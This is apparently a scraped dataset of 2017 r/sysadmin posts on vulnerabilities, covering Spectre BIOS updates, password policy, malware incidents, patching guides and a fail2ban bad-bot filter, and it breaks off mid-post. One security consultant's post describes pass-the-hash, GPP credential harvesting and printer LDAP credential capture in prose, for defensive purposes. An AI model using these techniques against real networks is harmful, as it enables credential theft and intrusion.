For more information, please refer to this article posted on Intels website. URL Rest assured we are working diligently with Intel and others in the industry to address the issue. We highly recommend you bookmark the following pages where we will be publishing the latest information on affected Dell / Dell EMC products including BIOS updates as they are available. Dell Client URL Dell Enterprise (Dell Servers, Storage and Networking) URL RSA (customer login required) URL Dell EMC Storage &amp; Data Protection (customer login required) URL Dell EMC CPSD (customer login required) URL In addition, Dell recommends customers follow security best practices for malware protection to protect against possible exploitation of these analysis methods. These practices include promptly adopting software updates, avoiding unrecognized hyperlinks and websites, and following secure password protocols. Thank you for your patience and understanding as we work to mitigate this vulnerability. Common FAQs Is my 12G System also impacted? - Yes, 10+ passed years systems are impacted. - For 14G and 13G Dell has already received the microcode fix from Intel and has released the proper BIOS versions to fix the issues. - 12G microcode should be provided next week by Intel, so Dell release will be by next week or two. - 11G microcode should be provided at the end of the month by Intel, so Dell release should be early February. What about older generations? - There is no plan at the moment for previous generations (10G/9G). Support EOL is well passed at this stage. - In addition from an OS perspective platforms like 9G supports only OS versions that are also EOL, and OS vendors have no plan at this stage to release fixes on these versions. Why Dell website is talking of enhancement and not fix? - Ex : URL - Enhancement to address CVE-2017-5715 (URL details to be published January 2018. - Updated the Intel Xeon Processor E5-2600 v4 Product Family Processor Microcode to version 0x0b000025. - Updated the Xeon Processor E5-2600 v3 Product Family Processor Microcode to version 0x3B. - NOTE: The wording is currently being worked to get it more explicit. However, the BIOS update is not a fix by itself as the Software layer is also involved in the resolution of the issue. BIOS is fixing the Hardware layer of the issue. OS patches will have to be applied to fix the Software layer of the issue. Why only CVE-2017-5715 is listed into the new BIOS release? - The BIOS release is the only one scheduled for the 3 CVE fixes (CVE-2017-5753 and CVE-2017-5715 - Spectre, CVE-2017-5754 -Meltdown). What is the performance impact? - From a BIOS perspective there is no measurable impact. - From an OS perspective, it may vary a lot depending of factors like OS type, workload and the portions of the overall fix you enable (OS specific). - As a general statement there might be some performance impact at software level anyway as there is mechanisms being implemented which should add some latency on some workloads Dell EMC continues to investigate this issue to identify any potential impact to products and will continue to update the above Knowledge Base Articles with information as it becomes available, including impacted products and remediation steps.

There're a few things I absolutely need to check off the list: 1. Device driversChipset, Audio drivers, SD card reader, Intel RAID, Rapid Start, Flight Mode, NVidia GTX 860M (preferably the latest), Intel HD 4600, Intel Wireless AC 7260 (latest driver fixing the KRACK vulnerability), Synaptics touchpad driver 2. Essential 'applications', typically also part of driver packages: VIA HD Audio Config, Hotkey utility (allows Fn + Fxx shortcuts), Sound Blaster Cinema 3. Non-essential applications: Chrome, 7-Zip. (And set these applications as default) 4. Configure colour in Intel HD Graphics Control Panel to reduce red and green, because the stock display colour calibration sucks. 5. Set the DPI scaling factor to 125%, and set the Metro app scaling to 'Smaller'. 6. Set Windows Explorer to show file extensions and the checkboxes. 7. Set a couple of registry keys. I'd like to do all this preferably 'silently', so that the user can begin using the computer straight away after booting up and 'setting up'. Thanks in advance, guys."

574,vulnerability,sysadmin,"Password Expiration was questioned, how should I respond?",25,7g8tzg,https://www.reddit.com/r/sysadmin/comments/7g8tzg/password_expiration_was_questioned_how_should_i/,2017-11-29 11:10:02,"Hey guys, I just had the technical manager at one of my clients who just recently started very aggressively demand that we stop doing password expiration. He's essentially pissed that he's been with the company for 90 days and he's gotten his first notification to change his 365 password. Normally this wouldn't be a big deal, but here's his response after I politely told him that for overall security reasons, password expiration and rotation is an important security standard: ""You guys are in IT and should be up on the latest when it comes to security to best serve us, your customer. And the latest wisdom is NO, changing passwords frequently is a BAD idea. (Proceeds to link 5 articles, 4 of which are all about the same statements given by Lorrie Cranor, an FTC Technologist who is of the opinion that password expiration is more of a vulnerability than an aid) If you have evidence to the contrary I would be interested in seeing it. Could you please review the material above and then on behalf of our best interest, suggest to (BOSSLADY) a more effective password security policy? I would imagine that this is part of your responsibilities as you oversee our IT, to help us develop proper policies that actually work and not just go through useless motions that just frustrate our workflow and do little to keep our data safe."" This guy is being an asshole, and I plan on writing a stern but polite reply regarding why we won't be changing the password rotation we have in place (90 days per the owner of the company for O365) The guy is a mechanical engineer being a know-it-all. I don't want to just tell him no, I'd love to tell him that he's wrong. So I've been compiling a list of reasons why password expiration and rotation is important, and honestly it's been an educating refresher for me. I'm trying to take every possibility into account, and that reflection has also caused me to think about scenarios that would not normally come to mind. (for me) 1. Mitigates exploitation of an older backup that may fall into the hands of a bad actor. 2. Protects against scenarios where a hash is acquired, but is not broken until after the password has already expired. 3. Encourages different passwords for different systems for the same user, which is why I stagger password rotation policies so they don't all hit at the same time. The idea is to compartmentalize access credential wise as much as possible. 4. Prevents users from using the same passwords for their work systems that they use for personal credentials like Social Media, personal Email, enterprise level online accounts (Which seem to be getting breached regularly these days) so that getting owned at home doesn't result in the company you work for getting owned too. 5. In the event of a breach, like it or not, password expiration and rotation is an industry standard. If you have to answer to your customers, you cannot say you were following industry standards for security policy in the event of an audit or a lawsuit, when you may have to own up to what happened to your customers because of a 7 year old password. Feel free to fuck my shit right up fam, but from my understanding of things, password rotation is still a good idea. I'd love to add to the list though. Oh, and the links that he sent were essentially banking on an older password that is a close variation of a current password being compromised somehow, and that some university had made an algorithm that is extremely accurate at creating wordlists for all the popular variants of that compromised passwords for people who just swap substitutions when it comes time to refresh a password."

However, I am starting to move our small company (5 users) to a domain environment before it gets to big to do so! I am trying to setup a Local Admin account so that if a computer cant access the domain, due to the users location or network connectivity, and they need to perform something which requires admin rights, they can do. From Googling around, there was a way to do this, but it was patched in 2014 due to a vulnerability, through the Control Panel/Local Users GPO options. I have found another way online, by using the GPO: Computer Config / Policies / Windows Settings / Security Settings / Restricted Groups. However, it seems that you still need to be connected to the domain for this account to login? Is this the case? Is there a better solution for this, excluding LAPS (thats something i will look into as well). I just need a simple solution to add an Administrator account to each Computer in the Domain that can login when the domain is unavailable. Thanks,"

I wanted to show everyone, and at the same time, see if someone has experience with how to deal with this kind of situation. I recently started working at a company where it has +150 servers, some locally in various countries, some others hosted at Amazon. After the recently attack of the worm WannaCry, they started to patch all the machines against this security vulnerability. But what happened ... they were 6 machines left to patch, and last friday we saw those machine's CPU stuck at 100%. After some analysis of what could cause that, we found that a process were running at background, calling a script ingo6.ps1 . Looking for some information about this, we found it's a cryptoworm , based on the Wannacry structure ( [Link_To_Worm_Info](URL which hijack all of your server resources and use it to mine bitcoins (you can even see the monero wallet in the script ... ) We tried with some ESET solutions we found on internet and blocked all outgoing and incoming connections caused by this worm. we can stabylize the server for about 15 minutes, but then it happens all over again. I'm putting my 2 cents in that some user activated a malware locally, and it's merged with a rootkit, that's why we cant completely delete it. Thing is i've worked with rootkit on User's Pc, were you can turn it off and scan the HDD before booting up. But this are productive servers, so turning them off is out of question. Do you all have any idea of how to deal with this kind of situation? I will try to add information if required. Thanks! EDIT: Now they're talking about renaming the process it hijack, the POWERSHELL, they renamed the powershell so it cannot use it ... i dont know if this will work, i doubt it. Sadly i dont have any opinion on all this, unless it's something REALLY useful ... "

602,vulnerability,sysadmin,Thank you CCleaner for being the straw that broke the camels back to remove local admins!,1057,70wkyy,https://www.reddit.com/r/sysadmin/comments/70wkyy/thank_you_ccleaner_for_being_the_straw_that_broke/,2017-09-19 03:39:12,"My company started out as two guys. One selling software, the other installing it. I was the 4th employee brought on as another installer, but always had sysadmin duties tied to my job. Fast foward now almost 8 years and the company is considerably larger and we've outgrown the ancient policy that users can be local admins on their machines. Eight, even five, or three years ago this worked, but not today. Today with the news of CCleaner I immediately jumped to action to see if we had any infected machines. Still being a small shop we lack the fancy tools to do these sorts of check automatically and building scripts or other solutions are beyond my skillset at this time. I resorted to checking each machine manually. After i verified there were no PC's with CCleaner I sent an email off to management with a very thorough cost and risk analysis that was associated with no just this vulnerability but how it can apply to virtually any piece of software out there someone may install. The email I got back was ""I agree, please remove local admin access from everyone's machine"" I've been wanting local admin gone from machines for years. Thanks CCleaner for finally making that happen! EDIT: shortly after the manual verification I realized our PRTG monitoring software could have searched for the CCleaner install directory. It wouldnt have told me the specific version, but it would have been good enough. EDIT2: I recieved a PM asking for a ""sanitized"" version of the email I sent. Its more of a followup email ---------------------------------- All, This is a good indication of the cost associated with local admins. This particular effort took 3hrs between research and validation. It doesnt include remediation as in this case there was nothing to remediate. We dont have the pricey tools that can tell us whats installed, and even if we did it would take constant auditing for any kind of pre-emptive mitigation. There really is nothing keeping anyone from installing sketchy software, or even software like CCleaner, which for the most part, has been an industry trusted PC maintenance tool but was infected with something anyway. Any time a report emerges that a version of just about any piece of software that someone might use, we will have to go through the same process which will only take more time as the number of users grows. The costs associated with this are: 1. IT researching the issue 2. IT verifying if organization is infected 3. Locating infection 4. Mitigation of infection 5. Loss of production of user(s) affected. 6. Unknown cost of the impact of the malware on the organization beyond an infected users pc 6a. For instance, if anyone ever unintentionally installed a variation of the crypto locker a good portion of &lt;storage hostname&gt; would get crypto locked as well as it looks for network shares after locking the local machines contents. &lt;somewhat important share1&gt;, &lt;somewhat important share2&gt;, &lt;somewhat important share3&gt;, and &lt;somewhat important share4&gt; would all be affected and would take time to restore from either local or offsite backup depending on the scenario. Our non tech savvy users are not local admins already. All of our engineers however are local admins. However, there are a few that arent nearly as tech-savvy as they think. Additionally even the most tech-savvy of people are still vulnerable, myself included. I've personally advocated the removal of these local admins in the past, but today was a good example of why we should move forward with it. This email is informational as to the risk associated with allowing them. If you have any additional questions please feel free to ask. ---------------------------------- "

The updater itself did its job and after the restart the BIOS was updated. I was thinking of deploying the BIOS update as an application but how would SCCM detect that the updater has done its job and then restart the machine? After that, because BitLocker encryption with MBAM is used, I would also have to reset the TPM-s of affected machines. In SCCM, how would go about doing this in a manageable manner?

622,vulnerability,sysadmin,Multiple servers and Let's Encrypt certificates with the same domain name,4,6ukxc7,https://www.reddit.com/r/sysadmin/comments/6ukxc7/multiple_servers_and_lets_encrypt_certificates/,2017-08-19 07:24:23,"Someone recently asked, how to automate renewal of Let's Encrypt certificates when the same domain name is needed on 2+ servers. And the floated several options: 1. Manually copy over the certificate every time it gets renewed ... 2. Set up subdomains and change config of all clients\users 3. Some kind of ""transparent"" subdomain hidden with re-directs / proxies 4. Set-up rsync / cron jobs to copy private keys across 5. Move services to the same server What I didn't like on that was that security would dictate what the infrastructure looks like. That' not really the way to do security - it should help, not be blamed for everything that didn't go to plan. Then I realized that Let's Encrypt doesn't require authorization of every request. If you successfully authorize, you will get an ""authz"" ticket, which is valid for several days. And while I don't like this as it can be exploited by bad guys, it's not going to change anytime soon - the validity period can be shortened to fewer days, or maybe hours, but it will stay. So ... a good way to make use of it in this particular use-case is to: 1. copy the Let's Encrypt account key (e.g., /etc/letsencrypt/accounts ) to all the servers that need the certificates. 2. make sure that the (master) server, which can properly authorize certification requests will do renewals on a certain time (e.g., of the week) - time T0 3. schedule all other servers to request certificate renewals in time T0+X, where X can be hours or even a few days. Job done, the master server will ensure that there's a valid authz authorization at Let's Encrypt servers, all the other servers will renew certificates without any questions. I have also written up a blog post about it [URL I sparked some discussion around [authz security some time ago @ community.letsencrypt.org](URL"

624,vulnerability,sysadmin,Common weaknesses on a corporate network.,95,6vk2uf,https://www.reddit.com/r/sysadmin/comments/6vk2uf/common_weaknesses_on_a_corporate_network/,2017-08-24 02:22:13,"As a security consultant, I thought I would chime in on the most common weaknesses I see at an average customers network and how you can fix them. **1. Local Administrator Password Reuse** This is usually the easiest way we gain access to the domain administrator: We compromise a single machine and perform privilege escalation. Once a local admin, it is possible to dump the local password hashes, including the local admin hash. There is no need to crack the password, since it's possible to perform a pass the hash attack with such an account. So all we need now is to enumerate the domain for users in the ""domain admins"" group and use a tool to query the domain servers for an active connection from a domain administrator workstation. Once located we use the obtained hash to ""jump"" to the host and either keylog until we gain the needed credentials or dump it in cleartext (if possible). **Solution:** Deploy LAPS from Microsoft on your network (from what I have heard, you shouldn't deploy it on the DC). This will ensure that passwords isn't reused across machines. **2. Default credentials in applications** I know you just want to test an application, before moving it to production. From my experience, nobody bothers to change the password once the application is fully configured. **Solution:** Change the password as quickly as possible. **3. Credentials in GPP** I have seen this multiple times, for some reason some administrators like to use the domain admin to execute commands on the machine. For the love of all that's Holy, please do not use your domain administrator to execute a restart command. It is not a big deal to parse Group Policy Preferences for usernames and passwords and are usually a great way to privilege escalate. **Solution:** Create a user with the least amount of rights to do the job. **4. Printers with default credentials** Most companies has printers with features such as ""print to mail"", where the printer uses LDAP to look up a specific user and sends the document to the users email. For some unknown reason, it is possible to change the destination IP address used to perform LDAP lookups on most printers, without re-entering the LDAP user AND password. The way this gets exploited, is by changing the IP address to my Pentesting machine, listen on the port and wait for somebody to perform an LDAP lookup and the username and password gets sent in cleartext to me. **Solution:** Use a good password to protect the printer. **5. Lacking proper patch management** Usually our client uses WSUS to make sure that all updates gets installed on their Windows machines. Sometimes WSUS does not manage to make the correct changes in the registry, so while the update is installed, it's not enabled. **Solution:** Some vulnerability scanners can detect if the update gets enabled properly. This also leads me to the next thing on my list: **6. Run a vulnerability scanner regularly** A vulnerability scanner is good for a lot of things, including checking if proper patch management is in place. Furthermore, it can be a helping hand since the vulnerability scene is in constant change. Personally I can recommend Nessus, which will also detect missing patches on Windows machines (if you scan using local admin credentials). Any questions and comments are welcome."

I work in the Boston area with a small IT team that gives support to about 150-200 users which are both local and remote. This building is part of a nation-wide company. We have abilities such as being admins to web servers, file servers, granting local admin access to computers, adding computers to the company's domain...etc. We work with our headquarters IT/security departments in Seattle to get the type of access that we have, and that access is never given out lightly. We are an IT team but we are basically guests to the system with very high security privileges compared to a regular company user. One chronic problem that we have had is with a certain IT support employee and how they work, specifically regarding the security side of their job. Many times the employee has been caught using and sharing others passwords to add computers to our domain (before we had permissions), sharing their passwords with multiple locations so they can join all of their out-of-compliance machines to the network, granting out-of-compliance machines to the network...etc. The main theme is that whatever is the quickest route, disregarding any company policies or security policies, that route will be taken. This is even more concerning as of lately due to the viruses like PetYa and WannaCry. Many machines have been re-granted network access even though those machines were taken off by the headquarters' security team for not having the specific patches for those viruses. The headquarters location has been changing their policies to tighten security and prevent issues with those and future vulnerabilities. The concerning thing is that when security measures and policies are blatantly disregarded, this puts the whole company/network at risk. This has been locally reported many, many times before but no one (even management) wants to bring it to the attention of our headquarters. This has been going on for more than two years. My question is: What is the best way to report such chronic security vulnerabilities to a security group with the lease amount of blow-back toward the person doing the reporting? I am trying to keep myself out of this as much as possible since the person being reported is someone I work with every day but I realize I cant stay 100% anonymous if I report this to the security admins. I have an interesting week coming up. Thank you!"

TL;DR at bottom, there's a lot of rubber duck troubleshooting here. I have a small personal site I run on an ec2.nano instance, It's bare bones, no scripts, and just has all of my personal work with the files generated via Ansible playbooks. I've never had anything internet facing but with how simple things are I'm not super worried about security (or should I be?). I don't have much security experience in this context. But aws security groups make this stupid easy. Anyway, First week I parsed through my apache logs and saw I'm getting slammed every 10 minutes with a vulnerability scanner from different IPs: x.x.x.x - - [05/Sep/2017:06:27:00 +0000] ""HEAD URL HTTP/1.1"" 404 288 ""-"" ""Mozilla/5.0 Jorgee"" x.x.x.x - - [05/Sep/2017:06:27:00 +0000] ""HEAD URL HTTP/1.1"" 404 288 ""-"" ""Mozilla/5.0 Jorgee"" x.x.x.x - - [05/Sep/2017:06:27:01 +0000] ""HEAD URL HTTP/1.1"" 404 288 ""-"" ""Mozilla/5.0 Jorgee"" I set up fail2ban to the best of my knowledge I think: Purpose of this thread: **some filters are working but I'm getting some weird behaviours and I'm not sure where to look to resolve it - I feel like every hit I get for configuring fail2ban is some blogpost from 2013-14, and their documentation is nothing but older third party references** I know I can configure apache to just ignore the user agent ""Jorgee"" but that is boring. I saw I can configure F2B to email me with whois's of the domains of the offending IPs and I thought it'd be fun to compile lists and play with the data. So, I enabled the bot filters, but saw they had nothing for the Jorgee agent (Jorgee is a well known web scanner). I figured the filter I needed to edit was `apache-badbots.conf` So, here's the filter, which looks for bad user agents: [Definition] badbotscustom = EmailCollector|WebEMailExtrac|TrackBack/1\.02|sogou music spider|**Mozilla/5.0 \Jorgee** badbots = Atomic_Email_Hunter [etc...] Wells Search II|WEP Search 00 failregex = ^&lt;HOST&gt; -.*""(GET|POST|HEAD).*HTTP.*""(?:%(badbots)s|%(badbotscustom)s)""$ This worked. Cool, but this isn't useful - How can I pick up a host trying to access like 50 default admin pages in a minute, regardless of user agent - I mean this is possible right? Anyway. Other issue I had was getting email to work, I'm a bit rusty on Postfix since the only time I've set it up is a redhat exam I took awhile back and all I really want is a no-reply notifications sent to my personal gmail account so feel free to give some pointers. I just apt'd it and ran the internet installer that comes with it, swapped out some variables in main.cf, made firewall rule, added port 25 outgoing to my security group, and added the variables and it works, I guess. It shows up in my inbox as from root@mydomain and a lot of shit is getting marked as spam, but I can probably just hack in some filters to ignore that. Only concern is that it says it's from root. That doesn't imply I set something up insecurely right? I guess it's just because the fail2ban service is ran as root it does that? Anyway, I'm getting flooded with jail stopped-started messages but it's kind of weird. I don't see anything concerning in my fail2ban logfiles, but I don't get why I'm getting these emails? ie: subject: [Fail2Ban] apache-auth: stopped on mydomain Hi, The jail apache-auth has been stopped. Regards, Fail2Ban Should this be of concern? The only thing I get hits for are people disabling these emails but, I'm kind of curious as to why I'm getting them in the first place. Anyway, **TL;DR:** Making personal site of all my old projects and art, basic barebones apache on an ec2 instance. Getting slammed by vulnerability scanners. Want to find an effective and fun way of banning and recording the offending hosts. Also looking for general advice on internet facing nodes.. although aws makes that kinda trivial it seems."

Duke ordered the scrub on the grounds that the company has connections to the Russian government and its software poses a security risk. &gt;The Department is concerned about the ties between certain Kaspersky officials and Russian intelligence and other government agencies, and requirements under Russian law that allow Russian intelligence agencies to request or compel assistance from Kaspersky and to intercept communications transiting Russian networks, the department said in a statement. The risk that the Russian government, whether acting on its own or in collaboration with Kaspersky, could capitalize on access provided by Kaspersky products to compromise federal information and information systems directly implicates U.S. national security. &gt;The directive comes months after the federal General Services Administration, the agency in charge of government purchasing, removed Kaspersky from its list of approved vendors. In doing so, the GSA suggested a vulnerability exists in Kaspersky that could give the Kremlin backdoor access to the systems the company protects. &gt;In a statement to The Washington Post on Wednesday, the company said: Kaspersky Lab doesnt have inappropriate ties with any government, which is why no credible evidence has been presented publicly by anyone or any organization to back up the false allegations made against the company. The only conclusion seems to be that Kaspersky Lab, a private company, is caught in the middle of a geopolitical fight, and its being treated unfairly even though the company has never helped, nor will help, any government in the world with its cyberespionage or offensive cyber efforts. &gt;Kaspersky Lab has always acknowledged that it provides appropriate products and services to governments around the world to protect those organizations from cyberthreats, but it does not have unethical ties or affiliations with any government, including Russia, the firm said. &gt;The directive comes in the wake of an unprecedented Russian operation to interfere in the U.S. presidential election that saw Russian spy services hack the networks of the Democratic National Committee and other political organizations and release damaging information. &gt;At least a half-dozen federal agencies run Kaspersky on their networks, the U.S. officials said, although there may be other networks where an agencys chief information security officer  the official ultimately responsible for systems security  might not be aware it is being used. &gt;The order applies only to civilian government networks, not the militarys. But the Defense Department, which includes the National Security Agency, does not generally use Kaspersky software, officials said. &gt;The U.S. intelligence community has long assessed that Kaspersky has ties to the Russian government, according to officials who spoke on the condition of anonymity to discuss internal deliberations. The companys founder, Eugene Kaspersky, graduated from a KGB-supported cryptography school and had worked in Russian military intelligence. &gt;In recent months concern has mounted inside the government about the potential for Kaspersky software to be used to gather information for the Russian secret services, officials said. &gt;Richard Ledgett, former NSA deputy director, hailed the move. Speaking Wednesday on the sidelines of the Billington CyberSecurity Summit in Washington, he noted that Kaspersky, like other Russian companies, is bound to comply with the directive of Russian state security services, by law, to share with them information from their servers. &gt;Concerns about Kaspersky software had been brewing for years, according to one former official who told The Post that some congressional staffers were warned by federal law enforcement officials as early as November 2015 not to meet with employees from Kaspersky, over concerns about electronic surveillance. &gt;When the GSA announced its July decision, it underscored that its mission was to ensure the integrity and security of U.S. government systems and networks and that Kaspersky was delisted after review and careful consideration. The action removed the company from the list of products approved for purchase on federal systems and at discounted prices for state governments. &gt;The directive will also put pressure on state and local governments that use Kasperskys products. Many had been left to speculate about the risks of sticking with the company or abandoning taxpayer-funded contracts, sometimes at great cost. In July, The Post found several state or local agencies that used Kasperskys anti-virus or security software had purchased or supported the software within the past two years. [Link](URL"

646,vulnerability,sysadmin,[Guide] Windows 2003 Patching with SCCM (06/2017 Edition) [X-post from /r/SCCM],2,6i8uik,https://www.reddit.com/r/sysadmin/comments/6i8uik/guide_windows_2003_patching_with_sccm_062017/,2017-06-20 05:46:42,"(Resubmitting since posting it at midnight on a Friday, many people haven't had a chance to see it...) # Introduction Hopefully folks find this useful, as I don't see a lot of guides to SCCM patching for Server 2003 out there. With the release of WannaCry and its associated patches, a lot of our clients have desperately needed to deploy patches. Last May released a single update, [MS17-010](URL This month,[ several more](URL have been released - leaving folks with 9 patches that aren't in SCCM to deploy, and a lot of manual work. Further, many clients don't understand what's necessary to permit 2003 to continue to be managed by modern SCCM installs, who often are moving towards HTTPS communications with SHA2 signatures and SSL certificates, both of which Server 2003 cannot understand by default. This has led a lot of people to incorrectly indicate that Server 2003/XP cannot be managed by SCCM CB. With this small guide I'm going to list out the prerequisites to getting SCCM working on 2003 AND teach you how to use SCCM to deploy these patches using the Software Updates feature of SCCM. Just about everything I'm listing here for 2003 applies to XP. # Teaching an old dog new tricks SCCM on 2003 requires a few prerequisites. Many people are now using SHA2 certificates, new ciphers, and modern operating systems that 2003 may not want to place nicely with. Before you can get the client onto them, you're going to need to install the following items manually: * BITS for Server 2003 - [KB923845](URL * SHA2 support for Server 2003 - [KB968730](URL * Enable support for AES128/256 cipher suites - [Hotfix 948963](URL (Note - there are [added steps](URL to disable weak ciphers that you should do as a security step, but aren't part of this guide.) * Latest Windows Update Agent for 2003 - [KB946928](URL * Digest Authentication fixes - [Hotfix 977073](URL Additional items that may be relevant, depending on your environment (E.g. hardened environments): * LSA Extended Protection - [KB968389](URL - Note that may need to manually reinstall [KB975467](URL Once all of these prerequisites are done, you can either enroll your server in the SCCM Client Identity certificate you've configured, or just deploy if you're not using SSL. From there, you've got a fully functioning SCCM client! # Server 2003 Patches - Sneaky Peaky Like If you bother looking through SCCM for these KB numbers, you're going to be looking for a while; Microsoft isn't pushing them via the Windows Update servers. This may lead people to think they need to manually create the applications and invoke the patch via WUSA - not so! **There actually is catalog information available and these updates are in the [update catalog](URL ## DO NOT TAKE THESE INSTRUCTIONS AS PERMISSION TO MUCK ABOUT THE WSUS CONSOLE. ## DO NOT TAKE THESE INSTRUCTIONS AS PERMISSION TO MUCK ABOUT THE WSUS CONSOLE. ## DO NOT TAKE THESE INSTRUCTIONS AS PERMISSION TO MUCK ABOUT THE WSUS CONSOLE. Now that that's been stated. Repeatedly. I must emphasize: **This activity is extremely [narrowly supported by Microsoft](URL Do not use the WSUS console for unsupported activities. Keep your arms and legs inside the ride at all times.** To get these into SCCM, first you need to go ahead and access the WSUS console on your Software Update Point. Via the context menu or action pane, select the [""Import Updates"" button](URL Click it, and you'll be directed to the [Microsoft Update Catalog website](URL from there punch in each of the updates we need to import: * KB3197835 * KB4012583 * KB4012598 * KB4018466 * KB4022747 * KB4024323 * KB4024402 * KB4025218 And click ""Add"" for the relevant products you need. Once you're good to go, [select ""View Basket""](URL in the upper right corner, and [click ""Import""!](URL The site will begin syncing your [updates into WSUS.](URL Once they're all [nice and done](URL initiate a synchronization [within SCCM](URL Now, obviously, the rules you've configured within SCCM must permit these items - if you're not synchronizing Server 2003 as a product, you won't see these updates even after a synchronization. You can check the typical log files if you've got issues (e.g. wsyncmgr.log). Remember, if you're impatient, once you start the Sync you can recycle the SMS_WSUS_SYNC_MANAGER process to make it kick off immediately. :) Once the sync is done, they should show up in the [SCCM console](URL Download them and [add them to a SUG](URL to deploy! Happy patching, folks! # Doing it without SCCM? If you just have WSUS, I still recommend the 2003 patches, as they'll greatly improve your security posture. But the bottom line is that once these updates are in WSUS, you can treat them like any other WSUS patch and approve them accordingly. SCCM manages approvals and such if you're using it, which is why I emphasize not to muck around, but if you're using only WSUS, that's all ya need to do to import any catalog update. :) "

Awhile ago, my employer 'lost' our security guy, and I was asked to take on the technical part of his role because I show interest and tend to think of operations from a 'security first' perspective. There really was no formal security team, and very little in the way of process, procedure or infrastructure. Our former guy was pretty smart, but was really just making it up as he went along while doing more than should be expected of one person (including pre-sales support.) He was spread too thin and there were many things left undone. (To complicate matters, we're a company that, IMO, should be **much** more focused on infrastructure security due to our line of business.) I want to build a security organization with good tools and process infrastructure so that this can be done professionally and as a shared responsibility amongst players from our DevOps and IT teams, rather than being one reactive cowboy out there on the range with a six shooter and a few cans of beans. My experience in security is limited to what I see as the practical systems, network, and general infrastructure security required to be good engineer (which I've been doing over over 20 years.) You know, use the principle of least privilege, consider that *every* piece of information is valuable for *some* nefarious purpose and must be treated as such, turn off and uninstall stuff you don't need, make sure you stay abreast of CVEs, run security scans and pen tests, keep firewalls updated and tight, study how to harden systems, etc. All of that good stuff. I understand the technical bits (at very least on a functional level.) It's all stuff that I think (wish?) any responsible, professional sysadmin would know and do. However, I've never built a security organization nor do I feel like I have a good handle on the process infrastructure necessary to do so. I'm working on deploying and/or acquiring and/or updating the technical parts we need (firewalls, cloud security components, pen testing services, vulnerability scanners, IDS, etc.) but I need to figure out what kind of tools and processes I need to put in place to tie all of the detection and protection systems together with human factors to provide good, big-picture security. All of that said, my question is this: if you had just been handed the Director of Security role for a company and had green field in front of you, what things would you focus upon in the first week, month and year? (Keep in mind that I have limited ability to add headcount...for instance, ""go hire 3 dedicated CISSPs and start staffing up a SOC"" isn't helpful advice.) "

How do you separate websites so they are secure? Do you use different users per site and if so how does this work with apache or nginx?

Guessing it tries to install something in the background or tries to take advantage of an Adobe vulnerability. Initially these types of emails would come in via spoofed addresses, these would be caught by the mail filter (Cisco Ironport). Recently we have seen an uptick in these emails coming from legitimate email addresses from companies in the same industry. I would assume these are compromised machines/accounts. My question is what steps (if any) can be taken to prevent these emails from coming in. My initial thought was content filtering for some of the key words noted above but that caused too many legit emails to be caught. Our CEO is really good about identifying the emails and notifying us, but is getting quite frustrated with the volume of these coming in. Any ideas are appreciated."

669,vulnerability,sysadmin,Stuck in a loop: money vs position and title vs duties. What gives?,2,6g7pcl,https://www.reddit.com/r/sysadmin/comments/6g7pcl/stuck_in_a_loop_money_vs_position_and_title_vs/,2017-06-09 21:00:40,"Sorry in advance for the rant, but I could use some opinions. I'm coming up on my first certification expiration dates and I've been thinking more and more about whether this is what I want to do. My ultimate goal has always been in networking (battled for my CCNA 2 years ago), but I've been bereft of any enterprise-level experience in that field. Over my 7.5 years of help desk (4 as a student, but there was no duty difference once I graduated, just a bigger paycheck), I've done everything from low-level sysadmin work (configuring servers + accounts), low-level security work (vulnerability remediation), and quite a few project management roles. Despite having my own VM setups at home, actual titles or enterprise experience seems to be demanded for even entry level positions-- and my resume hasn't listed anything but ""help desk"" since graduating. (and before it's mentioned: no, I cannot put erroneous titles, regardless of additional duties, because of various reasons I won't go into here). And while I'm still help desk, I've been the victim of substantial duty creep that I don't think I'm suited to handle appropriately. This is where both of my issues come in: Issue 1: in addition to being the help desk, I'm currently the ""project gopher"" for the CIO (in which he sends me an email with his idea and I implement it), job/ticket control (glorified secretary for the dept), field service, and now-- because of a clause in the contract that states I can be ""assigned other duties as necessary""-- I am responsible for the entirety of our network infrastructure until a suitable person can be found to be hired for the position. I was previously denied said position (while we had a network guy here to train me up) because it was more important to clear tickets (per CIO). But since I have a CCNA, I am considered qualified for this position-- and my company has confirmed that these duties (in ""limited amounts"") are my responsibility until a network engineer can fill the spot. Now, I realize this could be a valuable learning experience. And I am more than comfortable fulfilling the role. But I'm (rightfully, I think) extremely bitter and would love nothing more than to refuse to do anything. I'm having trouble navigating what I should do versus what I can do, and I'd love any opinions on that. I've also been denied any additional compensation (whether it be pay, vacation, etc). Issue 2: If one were to consider *only* help desk, I'd say I'm very well-paid. However, I'm currently doing (literally) four separate positions worth of work. I can move into higher-paying help desk positions at other locations, but the already-high wage I'm at now makes moving positions difficult, because taking any entry-level job for ""higher tier"" tech (e.g. systems or networking) would more than likely cut my wage in half, if not more. My attempts to get onto similarly-paying contracts in the area have failed (due to downsizing more than anything), and I feel I'm in a position where I either have to sit here for 2-3 years and grin and bear any (perceived) mistreatment until I can hopefully get promoted, or move elsewhere and start the clock over at help desk again. I'm currently in the process of the latter, but I'm already fighting some pretty bad career burnout. Cheers. "

Clickjacking, also known as a ""UI redress attack"", allows an attacker to use multiple transparent or opaque layers to trick a targeted user into clicking on a button or link on another page when they were intending to click on the the top level page. X-XSS-Protection: This HTTP header enables the browser built-in Cross-Site Scripting (XSS) filter to prevent cross-site scripting attacks. X-XSSProtection: 0; disables this functionality.

672,vulnerability,sysadmin,[Guide] Windows 2003 Patching with SCCM (06/2017 Edition) [X-Post /r/SCCM],14,6hqad1,https://www.reddit.com/r/sysadmin/comments/6hqad1/guide_windows_2003_patching_with_sccm_062017/,2017-06-17 09:53:42,"# Introduction Hopefully folks find this useful, as I don't see a lot of guides to SCCM patching for Server 2003 out there. With the release of WannaCry and its associated patches, a lot of our clients have desperately needed to deploy patches. Last May released a single update, [MS17-010](URL This month,[ several more](URL have been released - leaving folks with 9 patches that aren't in SCCM to deploy, and a lot of manual work. Further, many clients don't understand what's necessary to permit 2003 to continue to be managed by modern SCCM installs, who often are moving towards HTTPS communications with SHA2 signatures and SSL certificates, both of which Server 2003 cannot understand by default. This has led a lot of people to incorrectly indicate that Server 2003/XP cannot be managed by SCCM CB. With this small guide I'm going to list out the prerequisites to getting SCCM working on 2003 AND teach you how to use SCCM to deploy these patches using the Software Updates feature of SCCM. Just about everything I'm listing here for 2003 applies to XP. # Teaching an old dog new tricks SCCM on 2003 requires a few prerequisites. Many people are now using SHA2 certificates, new ciphers, and modern operating systems that 2003 may not want to place nicely with. Before you can get the client onto them, you're going to need to install the following items manually: * BITS for Server 2003 - [KB923845](URL * SHA2 support for Server 